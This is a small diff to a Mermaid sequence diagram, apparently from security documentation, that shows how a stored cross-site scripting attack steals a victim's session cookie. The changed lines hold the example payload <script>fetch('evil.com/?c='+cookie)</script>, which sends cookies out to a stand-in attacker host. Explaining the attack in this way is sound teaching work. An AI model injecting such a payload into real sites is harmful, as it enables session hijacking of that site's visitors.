@@ -30,10 +30,10 @@ sequenceDiagram
     participant S as Server / DB
     participant V as Victim Browser
 
-    A->>S: POST /comments<br/>body = &lt;script&gt;fetch('evil.com/?c='+cookie)&lt;/script&gt;
+    A->>S: POST /comments body=<script>fetch('evil.com/?c='+cookie)</script>
     S->>S: Stores comment unsanitized
     V->>S: GET /articles/123
-    S->>V: HTML page containing stored &lt;script&gt;...&lt;/script&gt;
+    S->>V: HTML page containing stored <script>...</script>
     V->>V: Browser executes injected script
     V-->>A: Cookie / session token exfiltrated
     Note over A,V: Every future visitor is also attacked
